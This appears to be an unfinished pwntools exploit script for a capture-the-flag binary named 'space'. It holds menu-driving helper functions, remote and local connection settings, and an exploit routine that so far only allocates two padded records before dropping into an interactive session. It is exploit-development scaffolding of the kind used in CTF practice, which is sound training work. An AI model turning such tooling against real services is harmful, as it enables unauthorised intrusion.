#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "space"
LIBCNAME = "libc-2.27.so"

hosts = ("jh2i.com","localhost","localhost")
ports = (50016,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(ix):
  c.recvuntil("> ")
  c.sendline(str(ix))

def noexit():
  c.recvuntil("[y/n]: ")
  c.sendline("n")

def make(first,last,year,month,day,size,comment):
  hoge(1)
  c.recvuntil("first name: ")
  c.sendline(first)
  c.recvuntil("last name: ")
  c.sendline(last)
  c.recvuntil("[y]: ")
  c.sendline("y")
  c.recvuntil("expires: ")
  c.sendline(str(year))
  c.recvuntil("expires: ")
  c.sendline(month)
  c.recvuntil("expires: ")
  c.sendline(str(day))
  c.recvuntil("[y]: ")
  c.sendline("y")
  c.recvuntil("comment: ")
  c.sendline(str(size))
  c.recvuntil("comment:")
  c.recvline()
  c.sendline(comment)
  noexit()

def printall():
  hoge(2)
  noexit()

def printbyuid(uid):
  hoge(3)
  c.recvuntil("user: ")
  c.sendline(str(uid))
  noexit()

def removelast():
  hoge(4)
  noexit()

def rocket():
  hoge(5)
  noexit()

## exploit ###########################################

def exploit():
  global c
  
  make("A"*0x1e,"B"*0x1e,2020,"A"*0xe,3,0x90,"D"*0x80)
  make("E"*0x1e,"F"*0x1e,2020,"G"*0xe,3,0x90,"H"*0x80)

## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
